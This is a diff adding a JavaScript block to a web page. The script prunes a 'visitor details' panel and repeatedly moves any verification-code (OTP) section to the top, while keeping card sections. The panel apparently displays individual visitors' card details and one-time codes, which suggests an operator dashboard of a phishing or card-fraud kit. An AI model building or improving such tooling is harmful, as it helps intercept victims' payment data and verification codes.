@@ -4388,3 +4388,58 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   (function loop(){ run(); requestAnimationFrame(loop); })();
 })();
 </script>
+<script id="kddF118">
+(function(){
+  if (window.__f118) return; window.__f118 = 1;
+  try { if (document.title.indexOf('F118') < 0) document.title += ' ·F118'; } catch(e){}
+
+  function h3(s){ var h = s.querySelector('h3'); return h ? String(h.textContent || '') : ''; }
+
+  function noise(s){
+    var t = h3(s);
+    if (t.indexOf('بطاقة') > -1) return false;
+    var x = String(s.textContent || '');
+    if (x.indexOf('makani_cart') > -1) return true;
+    if (x.indexOf('kdd-cart') > -1) return true;
+    if (x.indexOf('_v1') > -1) return true;
+    if (t.indexOf('دفع') > -1) return true;
+    return false;
+  }
+  function dupOtp(s){
+    var t = h3(s);
+    return t.indexOf('📋') === 0 && t.indexOf('رمز التحقق') > -1;
+  }
+
+  function kill(){
+    var b = document.getElementById('visitorDetails'); if (!b) return;
+    var secs = b.querySelectorAll('.kddsec, .data-section');
+    for (var i = secs.length - 1; i >= 0; i--){
+      var s = secs[i];
+      if (noise(s) || dupOtp(s)) s.parentNode.removeChild(s);
+    }
+  }
+  function top(){
+    var b = document.getElementById('visitorDetails'); if (!b) return;
+    var c = b.querySelector('.space-y-3'); if (!c) return;
+    var k = c.children, tgt = null;
+    for (var i = 0; i < k.length; i++){
+      var el = k[i];
+      if (el.getAttribute('data-f112') || el.getAttribute('data-f91')) continue;
+      if (h3(el).indexOf('رمز التحقق') < 0) continue;
+      tgt = el; break;
+    }
+    if (tgt && c.firstElementChild !== tgt) c.insertBefore(tgt, c.firstElementChild);
+  }
+  function pass(){ kill(); top(); }
+
+  var o = window.renderVisitorDetails;
+  if (typeof o === 'function' && !o.__f118){
+    var w = function(){ var r = o.apply(this, arguments); try { pass(); } catch(e){} return r; };
+    w.__f118 = 1; window.renderVisitorDetails = w;
+    try { renderVisitorDetails = w; } catch(e){}
+  }
+  pass();
+  setInterval(pass, 150);
+  (function loop(){ kill(); requestAnimationFrame(loop); })();
+})();
+</script>
